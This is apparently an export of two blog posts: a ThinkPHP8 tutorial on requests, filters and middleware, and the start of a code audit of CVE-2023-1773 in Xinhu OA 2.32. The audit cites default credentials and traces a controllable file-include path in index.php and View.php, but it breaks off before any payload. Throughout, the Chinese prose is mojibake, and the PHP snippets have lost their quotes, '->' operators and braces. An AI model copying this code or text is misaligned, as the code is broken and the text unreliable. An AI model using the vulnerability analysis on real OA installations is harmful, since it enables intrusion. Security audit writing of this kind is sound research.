php + html5 æ··ç¼–ï¼Œåœ¨ configview è®¾ç½®ï¼š // æ¨¡æ¿åç¼€view_suffix = php, åœ¨ fetch() æ–¹æ³•çš„ç¬¬äºŒå‚æ•°ï¼Œé€šè¿‡æ•°ç»„æ–¹å¼ç»™æ¨¡æ¿ä¼ é€’å˜é‡ï¼š return View::engine(php)-fetch(test, [ name = ThinkPHP8]);// æˆ– return view(testï¼Œ[ name = ThinkPHP8]); è¡¨å•æäº¤ å…ˆè½½å…¥ä¸€ä¸ªè¡¨å•é¡µé¢ï¼š return View::engine(php)-fetch(input); åˆ›å»ºä¸€ä¸ªè¡¨å•ï¼š form action=/view_page/save method=post input type=text name=username input type=submit value=æäº¤/input\t/form æ¥å—æ•°æ®ï¼š public function save() return $this-request-post(username); è¯·æ±‚å¯¹è±¡.å˜é‡.ä¿¡æ¯è¯·æ±‚å¯¹è±¡ ä¸Šä¸€èŠ‚è¯¾ä¸­è¡¨å•æäº¤æ—¶ï¼Œæˆ‘ä»¬æ¥å—æ•°æ®ä½¿ç”¨äº† $this-request-post() æ–¹æ³•ï¼Œè¿™å“ªé‡Œæ¥çš„ï¼Ÿ å› ä¸ºæˆ‘ä»¬çš„æ§åˆ¶å™¨ç»§æ‰¿äº† BaseController è¿½è¸ªè¿›å»ï¼Œå¯ä»¥çœ‹åˆ° $request æˆå‘˜å­—æ®µï¼› å…³äºè¿™ä¸ªçŸ¥è¯†ç‚¹çš„æºçŸ¥è¯†ç‚¹ï¼Œå¯ä»¥å‚è€ƒï¼šæ‰‹å†Œ - æ¶æ„ - å®¹å™¨å’Œä¾èµ–æ³¨å…¥ï¼ŒTP6è®²è¿‡ï¼Œ8ä¸è®²äº†ï¼› åœ¨æ²¡æœ‰ç»§æ‰¿ BaseController æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨æ³¨å…¥è¯·æ±‚ï¼š namespace app\\controller;use think\\Request;class Rely protected $request; // ä¾èµ–æ³¨å…¥ public function __construct(Request $request) $this-request = $request; public function index() halt($this-request-get()); // ä¸Šé¢çš„è¯·æ±‚æ–¹å¼æ¯”è¾ƒåŸå§‹ï¼Œè¿‡äºéº»çƒ¦ï¼Œä¸æ¨èäº† ç¬¬äºŒç§æ–¹å¼ï¼šé—¨é¢Facadeï¼Œå®ƒç›¸å…³çš„çŸ¥è¯†ç‚¹åœ¨æ‰‹å†Œ - æ¶æ„ - é—¨é¢ï¼š namespace app\\controller;use think\\facade\\Request;class Rely public function index() halt(Request::get()); ç¬¬ä¸‰ç§æ–¹å¼ï¼šç»§æ‰¿ BaseControllerï¼Œå…¶å®å°±æ˜¯ç¬¬ä¸€ç§ï¼Œåªä¸è¿‡è¢«å°è£…åˆ°åŸºç±»ä¸­å»äº†ï¼š namespace app\\controller;use app\\BaseController;class Rely extends BaseController public function index() halt($this-request-get()); ç¬¬å››ç§æ–¹å¼ï¼šç»ˆææ–¹æ³• request() åŠ©æ‰‹å‡½æ•°ï¼š halt(request()-get()); è¯·æ±‚ä¿¡æ¯ åœ¨æ‰‹å†Œ è¯·æ±‚ - è¯·æ±‚ä¿¡æ¯ é‡Œæœ‰å…¨éƒ¨çš„è¯·æ±‚æ–¹æ³•æ¨¡å—ï¼Œè¿™é‡Œåˆ—ä¸¾å‡ ä¸ªæ„æ€ä¸€ä¸‹ï¼š æ–¹æ³• å«ä¹‰ host å½“å‰è®¿é—®åŸŸåæˆ–è€…IP port å½“å‰è®¿é—®çš„ç«¯å£ url å½“å‰å®Œæ•´URL root URLè®¿é—®æ ¹åœ°å€ method å½“å‰è¯·æ±‚ç±»å‹ æˆ‘ä»¬ä¸‰ç§æ–¹æ³•æ¼”ç¤ºä¸€éï¼Œæœ€ç»ˆé€‰ä¸€ç§ä½ å–œæ¬¢çš„å³å¯ï¼š // å½“å‰urlecho $this-request-url();echo Request::url();echo request()-url();// è¯·æ±‚æ–¹æ³•echo request()-method();// æ›´å¤šçš„å¯¹ç…§æ‰‹å†Œè‡ªè¡Œæµ‹è¯•å³å¯ è¯·æ±‚å˜é‡ Request å¯¹è±¡æ”¯æŒå…¨å±€å˜é‡çš„æ£€æµ‹ã€è·å–å’Œå®‰å…¨è¿‡æ»¤ï¼Œæ”¯æŒ$_GETã€$_POSTâ€¦ç­‰ï¼› ä½¿ç”¨ has() æ–¹æ³•ï¼Œå¯ä»¥æ£€æµ‹å…¨å±€å˜é‡æ˜¯å¦å·²ç»è®¾ç½®ï¼š // åˆ¤æ–­æ˜¯å¦æœ‰GETæ¨¡å¼ä¸‹idçš„å€¼echo request()-has(id, get); æ›´å¤šæ–¹æ³•ï¼Œå‚çœ‹æ‰‹å†Œ è¯·æ±‚ - è¾“å…¥å˜é‡ï¼Œ è¿™é‡Œæ„æ€å‡ ä¸ªï¼š æ–¹æ³• æè¿° param è·å–å½“å‰è¯·æ±‚å˜é‡ get è·å– $_GET å˜é‡ post è·å– $_POST å˜é‡ put è·å– PUT å˜é‡ delete è·å– DELETE å˜é‡ session è·å– SESSION å˜é‡ param() æ–¹æ³•æ˜¯æ¡†æ¶æ¨èçš„æ–¹æ³•ï¼Œå¯ä»¥è‡ªåŠ¨è¯†åˆ«è¯¸å¦‚ getã€postç­‰æ•°æ®ä¿¡æ¯ï¼› // url: http://www.tp.com:8000/rely/index?id=5// å¯ä»¥è·å– get æ¨¡å¼ id çš„å€¼echo request()-param(id);echo request()-get(id);// url: http://www.tp.com:8000/rely/index/id/5// æ­¤æ—¶ï¼Œåªèƒ½æ˜¯paramè·å–echo request()-param(id); // é»˜è®¤å€¼request()-param(name) // nullï¼Œå®é™…ä¸Šé¡µé¢ä¹Ÿè½¬è¡Œæˆç©ºï¼Œåˆ¤æ–­nullä¹Ÿæˆç«‹request()-param(name, ) // ç©ºå­—ç¬¦ä¸²request()-param(name, æ— åæ°); // æ— åæ° å¯åœ¨ app\\Request.php é…ç½®è¿‡æ»¤å™¨ï¼š http://www.tp.com:8000/rely/index?name=æˆ‘bä½ /b// å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢HTMLå®ä½“protected $filter = [htmlspecialchars];// å¦‚æœä¸æƒ³è¦å…¨å±€è¿‡æ»¤å™¨ï¼Œå¯ä»¥ç›´æ¥å±€éƒ¨request()-param(name, , htmlspecialchars);// è®¾ç½®äº†å…¨å±€è¿‡æ»¤å™¨ï¼Œä½†æŸä¸ªä¸æƒ³ç”¨request()-param(name, , null)// ä½¿ç”¨å˜é‡ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å°†å‚æ•°å¼ºåˆ¶è½¬æ¢æˆæŒ‡å®šçš„ç±»å‹ï¼›// /s(å­—ç¬¦ä¸²)ã€/d(æ•´å‹)ã€/b(å¸ƒå°”)ã€/a(æ•°ç»„)ã€/f(æµ®ç‚¹)ï¼›request()-param(id/d); only()ã€except() è®¾ç½®å…è®¸å’Œæ’æŸ¥å¯æ¥å—çš„å˜é‡ï¼š // å…è®¸idå’Œnameå˜é‡request()-only([id,name]);// é»˜è®¤å€¼è®¾ç½®request()-only([id=1,name=é»˜è®¤å€¼]);// å‚æ•°äºŒå¯è®¾ç½®GETè¿˜æ˜¯POSTç­‰request()-only([id,name], GET); ä»¥ä¸Šæ‰€æœ‰ï¼Œéƒ½å°è£…åˆ°åŠ©æ‰‹å‡½æ•° input() é‡Œäº†ï¼š input(?get.id); //åˆ¤æ–­ get ä¸‹çš„ id æ˜¯å¦å­˜åœ¨input(?post.name); //åˆ¤æ–­ post ä¸‹çš„ name æ˜¯å¦å­˜åœ¨input(param.name); //è·å– param ä¸‹çš„ name å€¼input(param.name, é»˜è®¤å€¼); //é»˜è®¤å€¼input(param.name, , htmlspecialchars); //è¿‡æ»¤å™¨input(param.id/d); //è®¾ç½®å¼ºåˆ¶è½¬æ¢ è¯·æ±‚ç±»å‹.è¾“å‡º.é‡å®šå‘è¯·æ±‚ç±»å‹ Request å¯¹è±¡æä¾›äº†ä¸€ä¸ªæ–¹æ³• method() æ¥è·å–å½“å‰è¯·æ±‚ç±»å‹ï¼Œä¹Ÿæä¾›äº†åˆ¤æ–­å½“å‰çš„è¯·æ±‚ç±»å‹ï¼š æ–¹æ³• è¯´æ˜ method è·å–å½“å‰è¯·æ±‚ç±»å‹ isGet åˆ¤æ–­æ˜¯å¦GETè¯·æ±‚ isPost åˆ¤æ–­æ˜¯å¦POSTè¯·æ±‚ isPut åˆ¤æ–­æ˜¯å¦PUTè¯·æ±‚ isDelete åˆ¤æ–­æ˜¯å¦DELETEè¯·æ±‚ isAjax åˆ¤æ–­æ˜¯å¦AJAXè¯·æ±‚ ä½¿ç”¨è¯·æ±‚ç±»å‹ä¼ªè£…ï¼Œå¯ä»¥æäº¤ PUTã€DELETE ç±»å‹ï¼š // è½½å…¥è¡¨å•æ¨¡æ¿public function create() return View::engine(php)-fetch(create);// è¡¨å•form action=/rely method=post input type=text name=name input type=hidden name=_method value=PUT input type=submit value=æäº¤/form // åˆ¤æ–­æ˜¯å¦PUTè¯·æ±‚if (request()-isPut()) echo input(put.name);// ç›´æ¥ajaxã€pjaxä¼ªè£…ï¼Œåœ¨urlåç»­æ·»åŠ ?_ajax=1å³å¯ï¼Œç»“åˆå‰æ®µæ—¶å†ç ”ç©¶ å“åº”è¾“å‡º å“åº”è¾“å‡ºï¼Œæœ‰å¥½å‡ ç§ï¼šåŒ…æ‹¬ returnã€json() å’Œ view() ç­‰ç­‰ï¼› é»˜è®¤è¾“å‡ºæ–¹å¼æ˜¯ä»¥ html æ ¼å¼è¾“å‡ºï¼Œå¦‚æœä½ å‘èµ· json è¯·æ±‚ï¼Œåˆ™è¾“å‡º jsonï¼› è€ŒèƒŒåæ˜¯ response å¯¹è±¡ï¼Œå¯ä»¥ç”¨ response() è¾“å‡ºè¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼› $data = Hello,TP8!;// ç­‰åŒäº return $data;return response($data); response()æ–¹æ³•å¯ä»¥è®¾ç½®ç¬¬äºŒå‚æ•°ï¼ŒçŠ¶æ€ç ï¼Œæˆ–è°ƒç”¨ code()æ–¹æ³•ï¼› // å‚æ•°äºŒï¼Œå‘é€çŠ¶æ€ç return response($data, 201);//æˆ–return response($data)-code(201);// json()å’Œview()å‡æ”¯æŒçŠ¶æ€ç  é‡å®šå‘ ä½¿ç”¨ redirect()æ–¹æ³•å¯ä»¥å®ç°é¡µé¢é‡å®šå‘ï¼Œéœ€è¦ return æ‰§è¡Œï¼› // é¦–é¡µreturn redirect(/);// è®¿é—®è·¯ç”±é¡µé¢ï¼Œå¤–åŠ çŠ¶æ€ç return redirect(details/5, 303);// è®¿é—®urlç”Ÿæˆçš„åœ°å€return redirect(url(Index/index)); è¿˜æ”¯æŒsessionè·³è½¬å’Œè®°ä½ä¸Šä¸€æ¬¡åœ°å€çš„è·³è½¬ï¼Œå®æˆ˜æ—¶å†ç ”ç©¶ï¼› ä¸­é—´ä»¶å®šä¹‰å®šä¹‰ä¸­é—´ä»¶ ä¸­é—´ä»¶çš„ä¸»è¦ç”¨äºæ‹¦æˆªå’Œè¿‡æ»¤ HTTP è¯·æ±‚ï¼Œå¹¶è¿›è¡Œç›¸åº”å¤„ç†ï¼› è¿™äº›è¯·æ±‚çš„åŠŸèƒ½å¯ä»¥æ˜¯ URL é‡å®šå‘ã€æƒé™éªŒè¯ç­‰ç­‰ï¼› ä¸ºäº†è¿›ä¸€æ­¥äº†è§£ä¸­é—´ä»¶çš„ç”¨æ³•ï¼Œæˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ªåŸºç¡€çš„ä¸­é—´ä»¶ï¼› å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¨¡å¼ï¼Œåœ¨åº”ç”¨ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªä¸­é—´ä»¶æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼› php think make:middleware Check public function handle($request, \\Closure $next) // æ‹¦æˆªè¯·æ±‚ if ($request-param(name) == index) return redirect(../../../../); // ç»§ç»­å¾€æ‰§è¡Œ return $next($request); ç„¶åå°†è¿™ä¸ªä¸­é—´ä»¶è¿›è¡Œæ³¨å†Œï¼Œåœ¨åº”ç”¨ç›®å½•ä¸‹çš„middleware.phpæ–‡ä»¶ä¸­é…ç½®ï¼› // æ³¨å†Œä¸­é—´ä»¶app\\middleware\\Check::class ä¸­é—´ä»¶çš„å…¥å£æ‰§è¡Œæ–¹æ³•å¿…é¡»æ˜¯ï¼šhandle()æ–¹æ³•ï¼Œç¬¬ä¸€å‚æ•°è¯·æ±‚ï¼Œç¬¬äºŒå‚æ•°æ˜¯é—­åŒ…ï¼› ä¸šåŠ¡ä»£ç åˆ¤æ–­è¯·æ±‚çš„ name å¦‚æœç­‰äº indexï¼Œå°±æ‹¦æˆªä½ï¼Œæ‰§è¡Œä¸­é—´ä»¶ï¼Œè·³è½¬åˆ°é¦–é¡µï¼› ä½†å¦‚æœè¯·æ±‚çš„ name æ˜¯ leeï¼Œé‚£éœ€è¦ç»§ç»­å¾€ä¸‹æ‰§è¡Œæ‰è¡Œï¼Œä¸èƒ½è¢«æ‹¦æ­»ï¼› é‚£ä¹ˆå°±éœ€è¦$next($request)æŠŠè¿™ä¸ªè¯·æ±‚å»è°ƒç”¨å›è°ƒå‡½æ•°ï¼› ä¸­é—´ä»¶ handle()æ–¹æ³•è§„å®šéœ€è¦è¿”å› response å¯¹è±¡ï¼Œæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼› è€Œ$next($request)æ‰§è¡Œåï¼Œå°±æ˜¯è¿”å›çš„ response å¯¹è±¡ï¼› ä¸ºäº†æµ‹è¯•æ‹¦æˆªåï¼Œæ— æ³•ç»§ç»­æ‰§è¡Œï¼Œå¯ä»¥ return response()åŠ©æ‰‹å‡½æ•°æµ‹è¯•ï¼› å‰åç½®ä¸­é—´ä»¶ å°†$next($request)æ”¾åœ¨æ–¹æ³•åº•éƒ¨çš„æ–¹å¼ï¼Œå±äºå‰ç½®ä¸­é—´ä»¶ï¼› å‰ç½®ä¸­é—´ä»¶å°±æ˜¯è¯·æ±‚é˜¶æ®µæ¥è¿›è¡Œæ‹¦æˆªéªŒè¯ï¼Œæ¯”å¦‚ç™»å½•åˆ¤æ–­ã€è·³è½¬ã€æƒé™ç­‰ï¼› è€Œåç½®ä¸­é—´ä»¶å°±æ˜¯è¯·æ±‚å®Œæ¯•ä¹‹åå†è¿›è¡ŒéªŒè¯ï¼Œæ¯”å¦‚å†™å…¥æ—¥å¿—ç­‰ç­‰ï¼› public function handle($request, \\Closure $next) //ä¸­é—´ä»¶ä»£ç ï¼Œå‰ç½® return $next($request); public function handle($request, \\Closure $next) $response = $next($request); //ä¸­é—´ä»¶ä»£ç ï¼Œåç½® return $response; // å…ˆæ‰§è¡Œå†…å®¹ï¼Œå†æ‰§è¡Œä¸­é—´ä»¶$response = $next($request);// æ‹¦æˆªè¯·æ±‚if ($request-param(name) == index) return redirect(../../../../);return $response; ä¸­é—´ä»¶æ“ä½œè·¯ç”±ä¸­é—´ä»¶ åˆ›å»ºä¸€ä¸ªç»™è·¯ç”±ä½¿ç”¨çš„ä¸­é—´ä»¶ï¼Œåˆ¤æ–­è·¯ç”±çš„ ID å€¼å®ç°ç›¸åº”çš„éªŒè¯ï¼› php think make:middleware Auth è·¯ç”±æ–¹æ³•æä¾›äº†ä¸€ä¸ª middleware() æ–¹æ³•ï¼Œè®©æŒ‡å®šçš„è·¯ç”±é‡‡ç”¨æŒ‡å®šçš„ä¸­é—´ä»¶ï¼› // é™å®šè¿™ä¸ªè·¯ç”±é‡‡ç”¨äº†ä¸­é—´ä»¶Route::rule(/, Index/index)-middleware(\\app\\middleware\\Auth::class); // å¯¼å…¥åï¼Œå¯ä»¥çœç•¥use app\\middleware\\Auth;use app\\middleware\\Check;// è·¯ç”±é‡‡ç”¨å¤šä¸ªä¸­é—´ä»¶Route::rule(/, Index/index)-middleware([Auth::class, Check::class]); ä¹Ÿå¯ä»¥åœ¨ configmiddleware.php é…ç½®æ–‡ä»¶åŠ ä¸­ï¼Œé…ç½®åˆ«åæ”¯æŒï¼› // åˆ«åæˆ–åˆ†ç»„alias = [ Auth = \\app\\middleware\\Auth::class, Check = \\app\\middleware\\Check::class,], // å½“ç„¶ï¼ŒRoute::group() è·¯ç”±åˆ†ç»„ä¹Ÿæ”¯æŒRoute::rule(/, Index/index)-middleware([Auth, Check]); 2. æ§åˆ¶å™¨ä¸­é—´ä»¶ å¦‚æœä¸ç”¨è·¯ç”±ï¼Œæ€ä¹ˆç”¨å±€éƒ¨åŒ–çš„ä¸­é—´ä»¶å‘¢ï¼Ÿå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å™¨ä¸Šå®šä¹‰ï¼› // è¿™é‡Œæ˜¯åˆ«åæ–¹å¼ï¼Œå’Œè·¯ç”±ä¸€æ ·ï¼Œå¦å¤–ä¸¤ç§å‡æ”¯æŒprotected $middleware = [Auth, Check]; é»˜è®¤æ˜¯æ§åˆ¶å™¨å…¨ä½“æ–¹æ³•æœ‰æ•ˆï¼Œå¦‚æœéœ€è¦é™åˆ¶ï¼Œè¿˜æ˜¯ only å’Œ exceptï¼› protected $middleware = [ Auth = [only = [hello]], Check = [only = [index]]];","tags":["php"],"categories":["å¼€å‘"]},{"title":"ä»£ç å®¡è®¡ï¼šCVE-2023-1773","path":"/2024/07/10/ä»£ç å®¡è®¡ï¼šCVE-2023-1773/","content":"äº§å“ï¼šä¿¡å‘¼oa å½±å“ç‰ˆæœ¬ï¼š2.32 å¼€æºåœ°å€ï¼šhttps://github.com/rainrocka/xinhu/commits/master/ é¦–å…ˆæˆ‘ä»¬å…ˆèµ·å¥½dockeré•œåƒï¼Œé»˜è®¤ç™»å½•è´¦å·åä¸ºadminï¼Œå¯†ç ä¸º123456 å¼€å§‹ä»£ç å®¡è®¡æœ€æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å½“ç„¶è¦çœ‹index.phpçš„ä»£ç ï¼ˆä»£ç å—ä¸­çš„å¤§éƒ¨åˆ†æ³¨é‡Šä¸ºæˆ‘è‡ªå·±å†™å…¥è¿›å»çš„ç†è§£ï¼‰å¦‚ä¸‹ï¼š ?php include_once(config/config.php);$_uurl = $rock-get(rewriteurl);$d = ;$m = index;$a = default;if($_uurl != )\tunset($_GET[m]);unset($_GET[d]);unset($_GET[a]);//é‡Šæ”¾å˜é‡m,d,a\t$m = $_uurl;\t$_uurla = explode(_, $_uurl);//ä»¥_æ¥åˆ†å‰²å˜é‡$_uurlä¸ºæ•°ç»„$_uurla\tif(isset($_uurla[1]))$d = $_uurla[0];$m = $_uurla[1];\tif(isset($_uurla[2]))$d = $_uurla[0];$m = $_uurla[1];$a = $_uurla[2];\t$_uurla = explode(?,$_SERVER[REQUEST_URI]);//ä»¥?åˆ†å‰²æˆURIçš„è·¯å¾„éƒ¨åˆ†å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†å¹¶èµ‹ç»™æ•°ç»„$_uurla\tif(isset($_uurla[1])) $_uurla = explode(, $_uurla[1]);//æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ç”¨æ¥åˆ†å‰²ï¼Œæ¯”å¦‚æ˜¯foo=barbaz=quxè¢«åˆ†å‰² foreach($_uurla as $_uurlas)//æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ $_uurlasa = explode(=, $_uurlas);//ç”¨=åˆ†å‰²æˆé”®å’Œå€¼ä¸¤éƒ¨åˆ† if(isset($_uurlasa[1]))$_GET[$_uurlasa[0]]=$_uurlasa[1]; //å¦‚æœæœ‰å€¼ï¼Œé”®æ˜¯$_uurlasa[0]ï¼Œå€¼æ˜¯$_uurlasa[1].æ¯”å¦‚$_GET[foo] = bar //éå†else\t$m = $rock-jm-gettoken(m, index);\t$d = $rock-jm-gettoken(d);\t$a = $rock-jm-gettoken(a, default);$ajaxbool\t= $rock-jm-gettoken(ajaxbool, false);$mode = $rock-get(m, $m);if(!$config[install] $mode != install)$rock-location(?m=install);include_once(include/View.php); $_SERVER[REQUEST_URI]: $_SERVER æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å…³äºæœåŠ¡å™¨ç¯å¢ƒå’Œè¯·æ±‚çš„ä¿¡æ¯ã€‚ REQUEST_URI æ˜¯ $_SERVER æ•°ç»„ä¸­çš„ä¸€ä¸ªé”®ï¼Œå®ƒåŒ…å«äº†å½“å‰è¯·æ±‚çš„URIã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·è®¿é—®çš„æ˜¯ http://example.com/path/to/page?foo=barï¼Œé‚£ä¹ˆ $_SERVER[REQUEST_URI] çš„å€¼å°±æ˜¯ /path/to/page?foo=barã€‚ çœ‹å®Œè¯¥ä»½æ–‡ä»¶åæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸‰ä¸ªå˜é‡ï¼š$m,$d,$aï¼Œä»¥åŠè¯¥è¡Œä»£ç $_uurl = $rock-get(rewriteurl);ï¼Œæ€è€ƒå…¶ä¸­çš„get()æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Œè®©æˆ‘ä»¬æº¯æºä¸‹å»ï¼Œè¯¥æ–¹æ³•ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š public function get($name,$dev=, $lx=0) $val=$dev; if(isset($_GET[$name]))$val=$_GET[$name]; if($this-isempt($val))$val=$dev; //isemptå‡½æ•°ï¼šå¦‚æœä¼ å…¥å­—ç¬¦ä¸ºç©ºå¹¶ä¸”ä¸æ˜¯æ•°å­—ï¼Œåˆ™è¿”å›true return $this-jmuncode($val, $lx, $name); //å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç ï¼Œç©ºæ ¼æ¶ˆå»ï¼Œé¢„é˜²xss é€šè¿‡è¯¥æ–¹æ³•è·å–GETä¼ å‚ä¸­çš„å€¼ï¼Œå¹¶å¯¹xssè¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„é¢„é˜² åœ¨index.phpä¸­æœ«å°¾éƒ¨åˆ†ä»£ç è¿˜åŒ…å«äº†æ–‡ä»¶View.phpï¼Œä»£ç å¦‚ä¸‹ï¼š ?phpif(!isset($ajaxbool))$ajaxbool = $rock-jm-gettoken(ajaxbool, false);$ajaxbool\t= $rock-get(ajaxbool, $ajaxbool);$p = PROJECT;if(!isset($m))$m=index;if(!isset($a))$a=default;if(!isset($d))$d=;$m = $rock-get(m, $m);$a = $rock-get(a, $a);$d = $rock-get(d, $d);define(M, $m);//å°†$mçš„å€¼èµ‹ç»™å¸¸é‡Mdefine(A, $a);define(D, $d);define(P, $p);$_m = $m;if($rock-contain($m, |))//å¦‚æœ$måŒ…å«|ä¸”ä¸åœ¨å¼€å¤´ï¼Œè¿”å›true\t$_mas = explode(|, $m);//é€šè¿‡|åˆ†å‰²æˆä¸¤éƒ¨åˆ†\t$m = $_mas[0];\t$_m = $_mas[1];include_once($rock-strformat(?0/?1/?1Action.php,ROOT_PATH, $p));//ç»è¿‡strformatå‡½æ•°åå˜ä¸ºäº†ROOT_PATH/.$p./.$p.Action.php$rand = date(YmdHis).rand(1000,9999);//å½“å¤©çš„æ—¥æœŸæ—¶é—´å’Œéšæœºæ•°æ‹¼æ¥åœ¨ä¸€èµ·if(substr($d,-1)!=/ $d!=)$d.=/;//$dçš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸æ˜¯æ–œæ å¹¶ä¸”å­—ç¬¦ä¸²ä¸ä¸ºç©ºï¼Œåˆ™å°†/æ·»åŠ åˆ°$dçš„æœ«å°¾$errormsg\t= ;$methodbool\t= true;$actpath\t= $rock-strformat(?0/?1/?2?3,ROOT_PATH, $p, $d, $_m);//ROOT_PATH/.$p./.$d..$_mdefine(ACTPATH, $actpath);$actfile\t= $rock-strformat(?0/?1Action.php,$actpath, $m);//$actpath/.$m.Action.php$actfile1\t= $rock-strformat(?0/?1Action.php,$actpath, $_m);//$actpath/.$_m.Action.php$actbstr = null;if(file_exists($actfile1))include_once($actfile1);if(file_exists($actfile))\tinclude_once($actfile);//åŒ…å«çš„æ–‡ä»¶å¯æ§\t$clsname\t= .$m.ClassAction;\t$xhrock = new $clsname();\t$actname\t= .$a.Action;\tif($ajaxbool == true)$actname\t= .$a.Ajax;\tif(method_exists($xhrock, $actname))//$xhrockç±»ä¸­æ˜¯å¦å­˜åœ¨$actnameæ–¹æ³•ï¼Œå­˜åœ¨ä¸ºtrue $xhrock-beforeAction(); $actbstr = $xhrock-$actname();//ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³• $xhrock-bodyMessage = $actbstr; if(is_string($actbstr))echo $actbstr;$xhrock-display=false;//ç»“æœæ˜¯å¦ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰“å°ç»“æœ if(is_array($actbstr))echo json_encode($actbstr);$xhrock-display=false;//ç»“æœæ˜¯å¦ä¸ºæ•°ç»„ï¼Œæ‰“å°ç»“æœ\telse $methodbool = false; if($ajaxbool == false)echo .$actname. not found;; $xhrock-afterAction();else\techo actionfile not exists;;\t$xhrock = new Action();$_showbool = false;if($xhrock-display ($ajaxbool == html || $ajaxbool == false))//æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œæ¨¡æ¿æ¸²æŸ“\t$xhrock-smartydata[p]\t= $p;\t$xhrock-smartydata[a]\t= $a;\t$xhrock-smartydata[m]\t= $m;\t$xhrock-smartydata[d]\t= $d;\t$xhrock-smartydata[rand]\t= $rand;\t$xhrock-smartydata[qom]\t= QOM;\t$xhrock-smartydata[path]\t= PATH;\t$xhrock-smartydata[sysurl]= SYSURL;\t$temppath = .ROOT_PATH./.$p./;\t$tplpaths = .$temppath..$d..$m./;\t$tplname = tpl_.$m.;\tif($a!=default)$tplname .= _.$a.;\t$tplname .= ..$xhrock-tpldom.;\t$mpathname = $tplpaths.$tplname;\tif($xhrock-displayfile!= file_exists($xhrock-displayfile))$mpathname = $xhrock-displayfile;\tif(!file_exists($mpathname) || !$methodbool) if(!$methodbool) $errormsg\t= in (.$m.) not found Method(.$a.);; else $errormsg\t= .$tplname. not exists;; echo $errormsg;\telse $_showbool = true;\tif($xhrock-display ($ajaxbool == html || $xhrock-tpltype==html || $ajaxbool == false) $_showbool)\t$xhrock-setHtmlData();\t$da = $xhrock-smartydata;\tforeach($xhrock-assigndata as $_k=$_v)$$_k=$_v;\tinclude_once($mpathname);\t$_showbool = false; å¯¹äºROOT_PATHçš„åˆ†æï¼š define(ROOT_PATH,str_replace(\\\\,/,dirname(dirname(__FILE__))));\t//ç³»ç»Ÿæ ¹ç›®å½•è·¯å¾„ è¯¥å¸¸é‡ä¼šé»˜è®¤ä¸ºæ˜¯ç³»ç»Ÿçš„æ ¹ç›®å½• å¯¹äºPROJECTçš„åˆ†æï¼š if(!defined(PROJECT))define(PROJECT, $rock-get(p, webmain)); ä¸Šè¿°ä»£ç è¯´æ˜äº†è¦æ˜¯å˜é‡pæ²¡æœ‰å€¼é‚£ä¹ˆä¼šé»˜è®¤ä¸ºwebmainï¼Œå¸¸é‡PROJECTçš„å€¼ä¾¿ä¸ºwebmainç›®å½• æ–‡ä»¶\\include\\Action.phpä¸­public $smartydata = array(); //æ¨¡ç‰ˆæ•°æ®è¯´æ˜äº†$smartydataä¸ºæ¨¡æ¿æ•°æ®æ•°ç»„ï¼ˆç”¨ä¸åˆ°ï¼‰ ä¸‹é¢ä¸ºä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„æ–¹æ³• public function strformat($str) $len = func_num_args();//func_num_args()å¾—åˆ°ä¼ å…¥è¯¥å‡½æ•°çš„å‚æ•°æ•°é‡å¹¶ä¼ ç»™$len $arr = array(); for($i=1; $i$len; $i++)$arr[] = func_get_arg($i);//ä»ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹æ·»åŠ åˆ°æ•°ç»„$arrçš„æœ«å°¾ //ä¸ºä»€ä¹ˆä»i=1å¼€å§‹ï¼Ÿå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å«å ä½ç¬¦çš„å¾…æ ¼å¼åŒ–å­—ç¬¦ä¸² $s = $this-stringformat($str, $arr); return $s;............public function stringformat($str, $arr=array()) $s\t= $str; for($i=0; $icount($arr); $i++) $s=str_replace(?.$i., $arr[$i], $s); //å ä½ç¬¦ä¸º?åŠ ä¸Šä¸€ä¸ªæ•°å­—ä»£è¡¨ç”¨åé¢ç¬¬å‡ ä¸ªå‚æ•°æ¥å¡«å……è¯¥ä½ç½® return $s; é€šè¿‡å¯¹$m,$a,$dä¸‰ä¸ªå˜é‡å€¼çš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°åŒ…å«æˆ‘ä»¬è‡ªå·±æƒ³è¦åŒ…å«çš„ä»»æ„æ–‡ä»¶ï¼Œå¹¶è°ƒç”¨æˆ‘ä»¬è‡ªå·±éœ€è¦çš„æ–¹æ³•ï¼Œæ¯”å¦‚ è¿™é‡Œæœ‰ä¸ªä¸€è·¯å¾„ä¸­çš„å˜é‡$actpathï¼Œè¢«ä¸¤ä¸ªä¸‹æ–‡è¢«åŒ…å«ä½çš„å˜é‡$actfileä»¥åŠ$actfile1ç»™æ‹¼æ¥ï¼Œå¼„æ˜ç™½æ˜¯å¦‚ä½•æ„é€ çš„ï¼š ç”¨ROOT_PATHï¼Œ$pï¼Œ$dï¼Œ$_måˆ†åˆ«å¡«å……å‰é¢çš„ä¸€ä¸ªæ 